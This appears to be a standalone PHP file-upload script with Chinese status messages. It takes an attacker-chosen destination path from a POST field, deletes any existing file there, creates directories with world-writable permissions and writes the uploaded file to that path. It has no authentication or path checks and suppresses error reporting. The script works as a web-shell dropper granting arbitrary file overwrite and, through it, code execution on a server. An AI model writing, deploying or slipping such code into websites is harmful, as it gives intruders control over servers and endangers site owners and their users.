<?php
@error_reporting(E_ALL & ~E_NOTICE & ~E_WARNING);
function mkdirs($path, $mod = 0777) {
    if(is_dir($path)){
        return chmod($path, $mod);
	}
	else{
        $old = umask(0);
        if(mkdir($path, $mod, true) && is_dir($path)){
            umask($old);
            return true;
		}
		else{
            umask($old);
        }
    }
    return false;
}

if($_POST['to']){
    $to = $_POST['to'];
    if(file_exists($to)){
		echo "有同名文件，删除！";
        unlink($to);
	}
	else{
		echo "没有同名文件";
        $dir = dirname($to);
		if(!file_exists($dir)){
			echo $dir."路径不存在，创建！";
            mkdirs($dir);
		}
    }
    echo move_uploaded_file($_FILES["file"]["tmp_name"], $to) ? $_FILES["file"]["name"]."上传成功" : $_FILES["file"]["name"]."上传失败";
}
else{
    echo "are you ready?";
}